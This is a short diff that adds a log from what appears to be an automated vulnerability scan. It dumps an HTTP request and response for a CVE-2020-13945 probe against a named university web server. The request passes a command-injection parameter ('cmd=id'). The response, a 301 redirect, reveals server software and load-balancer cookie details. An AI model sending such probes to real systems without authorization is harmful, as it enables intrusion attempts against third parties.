@@ -1,0 +1,25 @@
+[CVE-2020-13945] Dumped HTTP request for https://chemcal.chemistry.unimelb.edu.au/30v0wAi7pB7LyuCZAPvt6PGGjFQ?cmd=id
+
+
+GET /30v0wAi7pB7LyuCZAPvt6PGGjFQ?cmd=id HTTP/1.1
+Host: chemcal.chemistry.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept-Encoding: gzip
+
+
+[CVE-2020-13945] Dumped HTTP response https://chemcal.chemistry.unimelb.edu.au/30v0wAi7pB7LyuCZAPvt6PGGjFQ?cmd=id
+
+HTTP/1.1 301 MOVED PERMANENTLY
+Connection: close
+Transfer-Encoding: chunked
+Content-Language: en-us
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:17:39 GMT
+Location: http://chemcal.chemistry.unimelb.edu.au/30v0wAi7pB7LyuCZAPvt6PGGjFQ/?cmd=id
+Server: Apache/2.4.37 (Red Hat Enterprise Linux) mod_wsgi/4.7.0 Python/2.7
+Set-Cookie: django_language=en; Path=/
+Set-Cookie: BIGipServer~app_science_chemcal_prod~pool_science_chemcal_prod_80=4593580.20480.0000; path=/; Httponly; Secure
+Vary: Accept-Language
+
+
